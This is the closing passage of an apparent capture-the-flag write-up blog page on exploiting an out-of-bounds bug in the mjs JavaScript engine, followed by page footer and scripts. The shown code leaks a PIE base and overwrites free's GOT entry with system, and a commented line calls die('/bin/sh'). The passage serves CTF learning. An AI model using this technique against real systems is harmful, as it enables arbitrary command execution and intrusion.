value:&#x27;</span>, environ);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> pie_leak = <span class="title function_">read64</span>(environ - <span class="number">0x80</span>);</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;pie_leak:&#x27;</span>, pie_leak);</span><br><span class="line"><span class="keyword">let</span> pie_base = pie_leak - <span class="number">0x10020</span>;</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;pie_base:&#x27;</span>, pie_base);</span><br><span class="line"></span><br><span class="line"><span class="comment">// mjs2가 free_got 가리키게 한 다음에 [mjs2]에 system 주소 쓰기</span></span><br><span class="line"><span class="keyword">let</span> free_got = pie_base + <span class="number">0x2c018</span>;</span><br><span class="line"><span class="title function_">write64</span>(free_got, system);</span><br><span class="line"></span><br><span class="line"><span class="comment">// die를 호출해서 풀이도 가능</span></span><br><span class="line"><span class="comment">// die(&#x27;/bin/sh\x00&#x27;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// system 함수는 인자가 하나니까 첫 번째 인자를 호출하는 함수를 조작하는 것을 목표</span></span><br></pre></td></tr></table></figure>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/tags/">Tag</a></li>
         
          <li><a href="/categories/">Category</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">1.</span> <span class="toc-text">Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1"><span class="toc-number">1.1.</span> <span class="toc-text">(1)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2"><span class="toc-number">1.2.</span> <span class="toc-text">(2)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solve-1"><span class="toc-number">2.</span> <span class="toc-text">Solve 1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">2.1.</span> <span class="toc-text">Exploit Code</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solve-2"><span class="toc-number">3.</span> <span class="toc-text">Solve 2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code-1"><span class="toc-number">3.1.</span> <span class="toc-text">Exploit Code</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/230318-kalmarctf2023-mjs/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/230318-kalmarctf2023-mjs/&text=KalmarCTF 2023 - mjs (JS Engine, OOB)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/230318-kalmarctf2023-mjs/&title=KalmarCTF 2023 - mjs (JS Engine, OOB)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/230318-kalmarctf2023-mjs/&is_video=false&description=KalmarCTF 2023 - mjs (JS Engine, OOB)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=KalmarCTF 2023 - mjs (JS Engine, OOB)&body=Check out this article: https://jiravvit.github.io/230318-kalmarctf2023-mjs/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/230318-kalmarctf2023-mjs/&title=KalmarCTF 2023 - mjs (JS Engine, OOB)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/230318-kalmarctf2023-mjs/&title=KalmarCTF 2023 - mjs (JS Engine, OOB)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/230318-kalmarctf2023-mjs/&title=KalmarCTF 2023 - mjs (JS Engine, OOB)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/230318-kalmarctf2023-mjs/&title=KalmarCTF 2023 - mjs (JS Engine, OOB)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/230318-kalmarctf2023-mjs/&name=KalmarCTF 2023 - mjs (JS Engine, OOB)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/230318-kalmarctf2023-mjs/&t=KalmarCTF 2023 - mjs (JS Engine, OOB)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2022-2023
    jir4vvit
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'jiravvit-github-io';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>

<!-- utterances Comments -->

</body>
</html>
